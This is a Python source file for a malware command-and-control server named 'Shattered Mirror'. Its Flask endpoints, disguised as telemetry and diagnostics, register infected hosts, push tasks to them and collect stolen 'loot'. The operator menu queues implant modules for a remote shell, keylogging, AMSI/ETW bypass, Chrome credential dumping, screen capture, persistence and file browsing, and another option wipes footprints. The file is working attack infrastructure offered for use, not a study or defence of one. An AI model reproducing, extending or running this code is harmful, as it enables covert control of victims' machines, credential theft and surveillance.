import os
import sys
import threading
import time
import logging
import json
import msvcrt
import subprocess
from flask import Flask, request, jsonify

# ---------------------------------------------------------
# SHATTERED MIRROR: MASTER C2 SUITE (ULTIMATE EDITION)
# ---------------------------------------------------------

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

active_bots = {}    # ip -> last_seen
task_queue = {}     # ip -> [tasks]
loot_vault = []      # list of results

def get_clean_ip():
    ip = request.remote_addr
    return "127.0.0.1" if ip == "::1" else ip

@app.route('/api/v2/telemetry', methods=['POST'])
def heartbeat():
    bot_ip = get_clean_ip()
    active_bots[bot_ip] = time.time()
    
    if bot_ip in task_queue and len(task_queue[bot_ip]) > 0:
        task = task_queue[bot_ip].pop(0)
        print(f"\033[94m[*] [PULSE] Heartbeat from {bot_ip} | [TASK] Dispatching: {task['payload']}\033[0m")
        return jsonify(task), 200
    
    print(f"\033[90m[*] [PULSE] Heartbeat from {bot_ip} | No pending tasking.\033[0m", end='\r')
    return "NO_TASK", 200

@app.route('/api/v2/task/push', methods=['POST'])
def push_task():
    bot_ip = request.args.get('ip')
    if bot_ip == "::1": bot_ip = "127.0.0.1"
    data = request.get_json(silent=True)
    if bot_ip and data:
        if bot_ip not in task_queue: task_queue[bot_ip] = []
        task_queue[bot_ip].append(data)
        return jsonify({"status": "queued"}), 200
    return jsonify({"status": "error"}), 400

@app.route('/api/v1/loot/poll', methods=['GET'])
def poll_loot():
    bot_ip = request.args.get('ip')
    # Simple poll: return everything for now, or just the last few
    bot_loot = [l for l in loot_vault if bot_ip in l]
    return jsonify({"items": bot_loot[-5:]}), 200

@app.route('/api/v1/loot', methods=['POST'])
def receive_loot():
    bot_ip = get_clean_ip()
    data = request.get_json(silent=True)
    if data:
        blob = data.get('diagnostic_blob', 'empty')
        loot_vault.append(f"[{bot_ip}] {blob}")
    return jsonify({"status": "received"}), 200

def run_flask(listen_port):
    app.run(host='0.0.0.0', port=listen_port, debug=False, use_reloader=False)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("\033[91m")
    print(r"""
  _________.__            __    __                           .___
 /   _____/|  |__ _____ _/  |__/  |_  ___________   ____   __| _/
 \_____  \ |  |  \\__  \\   __\   __\/ __ \_  __ \_/ __ \ / __ | 
 /        \|   Y  \/ __ \|  |  |  | \  ___/|  | \/\  ___// /_/ | 
/_______  /|___|  (____  /__|  |__|  \___  >__|    \___  >____ | 
        \/      \/     \/                \/            \/     \/ 
                 MIRROR COMMAND & CONTROL v1.0
    """)
    print("\033[0m")

def bot_session(target_ip):
    # Auto-Task System Info on first connect to "answer" the operator
    if target_ip not in task_queue: 
        task_queue[target_ip] = []
        task_queue[target_ip].append({"atom_id": 3, "payload": "INIT_SESSION"})

    last_processed_loot_len = 0
    while True:
        clear_screen()
        print_banner()
        print(f"\033[96m[--- ACTIVE SESSION: {target_ip} ---]\033[0m")
        print("\033[92m(Pulse: Locked | Signal: 100% | Encryption: RC4-PSK)\033[0m\n")
        
        # Show last 10 loot items for this specific bot
        bot_loot = [l for l in loot_vault if l.startswith(f"[{target_ip}]") or target_ip in l][-10:]
        if bot_loot:
            print("\033[93m[BOT TELEMETRY FEED]:\033[0m")
            for line in bot_loot: print(f"  {line}")
            print("-" * 50)

        print("  [1] Remote Shell (Atom 10)     [6] Screen Capture (Atom 06)")
        print("  [2] Keylogger (Atom 02)        [7] Persist (Atom 07)")
        print("  [3] System Info (Atom 03)      [8] Proc Manager (Atom 08)")
        print("  [4] AMSI/ETW Bypass (Atom 04)  [9] File Browser (Atom 09)")
        print("  [5] Browser Looter (Atom 05)   [X] Network Scanner (Atom 01)")
        print("\n  [L] Open Live Log Window       [0] Return to Main Menu")
        
        choice = ""
        # Non-blocking check for new loot while waiting for input or refresh
        start_wait = time.time()
        while time.time() - start_wait < 5: # Refresh screen every 5s if idle
            if msvcrt.kbhit():
                char = msvcrt.getch()
                if char == b'\r': # Enter pressed
                    break
                choice = char.decode('utf-8').upper()
                break
            time.sleep(0.1)

        if not choice: continue # Just refresh
        if choice == '0': break
        
        atom_id = 0
        payload = ""
        if choice == '1': atom_id = 10
        elif choice == '2': atom_id = 2; payload = "START"
        elif choice == '3': atom_id = 3; payload = "INFO"
        elif choice == '4': atom_id = 4; payload = "PATCH"
        elif choice == '5': atom_id = 5; payload = "DUMP_CHROME"
        elif choice == '6': atom_id = 6; payload = "CAPTURE"
        elif choice == '7': atom_id = 7; payload = "INSTALL"
        elif choice == '8': atom_id = 8; payload = "LIST"
        elif choice == '9': 
            atom_id = 9
            payload = input("[?] Target Path: ")
        elif choice == 'X': atom_id = 1; payload = "SCAN_LOCAL"
        elif choice == 'L':
            subprocess.Popen(['start', 'cmd', '/k', f'title SHATTERED LOGS: {target_ip} && echo [!] MONITORING {target_ip} FEED...'], shell=True)
            continue
            
        if atom_id == 10:
            # SPAWN DEDICATED SHELL WINDOW
            c2_url = f"http://localhost:6969"
            subprocess.Popen(['start', 'cmd', '/k', f'python Shell_Session.py {c2_url} {target_ip}'], shell=True)
            print(f"\n\033[92m[+] Interactive Shell spawned in new window for {target_ip}.\033[0m")
            time.sleep(2)
            continue

        if atom_id > 0:
            task_queue[target_ip].append({"atom_id": atom_id, "payload": payload})
            print(f"\n\033[92m[+] ATOM {atom_id} Tasking Synchronized. Waiting for next heartbeat...\033[0m")
            time.sleep(1.5)

def main_loop():
    while True:
        try:
            clear_screen()
            print_banner()
            num_bots = len([b for b, t in active_bots.items() if time.time() - t < 300]) # Active in last 5 min
            print(f"\033[96m[--- MASTER CONTROL UNIT ---]\033[0m \033[92m(Pulse Nodes: {num_bots})\033[0m")
            print("  [1] Implant Manager (Live Bot List)")
            print("  [2] Global Loot Vault (History)")
            print("  [3] Wipe Payload Footprints")
            print("  [0] Terminate Mirror Network\n")
            
            if loot_vault: 
                print("\033[93m[LATEST SIGNAL]:\033[0m " + loot_vault[-1])
            
            choice = ""
            start = time.time()
            while time.time() - start < 1: # Refresh every 1s
                if msvcrt.kbhit():
                    choice = msvcrt.getch().decode('utf-8')
                    break
                time.sleep(0.1)

            if choice == '1':
                while True:
                    clear_screen()
                    print("\033[96m[--- IMPLANT MANAGER ---]\033[0m (Live Update | 'q' to back)")
                    print("-" * 70)
                    print(f"{'ID':<3} | {'ENDPOINT IP':<18} | {'LAST PULSE':<12} | {'STATUS'}")
                    print("-" * 70)
                    ips = list(active_bots.keys())
                    ips.sort(key=lambda x: active_bots[x], reverse=True) # Newest first
                    
                    for i, ip in enumerate(ips):
                        elapsed = int(time.time() - active_bots[ip])
                        if elapsed < 60: status = "\033[92mONLINE\033[0m"
                        elif elapsed < 180: status = "\033[93mIDLE\033[0m"
                        else: status = "\033[91mLOST\033[0m"
                        print(f"{i+1:<3} | {ip:<18} | {elapsed:<11}s | {status}")
                    
                    print("\n[?] Enter ID to connect to bot, or 'q' to return.")
                    
                    key = ""
                    # Non-blocking wait with refresh
                    sw = time.time()
                    while time.time() - sw < 1:
                        if msvcrt.kbhit():
                            char = msvcrt.getch().decode('utf-8')
                            if char.lower() == 'q': key = 'q'; break
                            if char.isdigit(): key += char # Support multi-digit IDs if needed
                            # If they press enter, proceed with what they typed
                            break
                        time.sleep(0.1)

                    if key.lower() == 'q': break
                    if key.isdigit():
                        idx = int(key) - 1
                        if 0 <= idx < len(ips):
                            bot_session(ips[idx])
                            break
            elif choice == '2':
                clear_screen(); print("\033[93m[--- GLOBAL SIGNAL VAULT (Last 50) ---]\033[0m\n")
                for i in loot_vault[-50:]: print(i)
                input("\n\033[90mPress Enter to return...\033[0m")
            elif choice == '3':
                print("[!] Purging project environment...")
                os.system("..\\full_cleaner.bat")
                time.sleep(1.5)
            elif choice == '0':
                print("[!] Shutting down C2...")
                os._exit(0)
        except KeyboardInterrupt:
            print("\n[!] Emergency console exit...")
            os._exit(0)

if __name__ == '__main__':
    clear_screen()
    print_banner()
    listen_port = 6969
    try:
        p_in = input(f"[?] Listen Port [{listen_port}]: ")
        if p_in: listen_port = int(p_in)
    except Exception: pass 
    
    server = threading.Thread(target=run_flask, args=(listen_port,), daemon=True)
    server.start()
    main_loop()
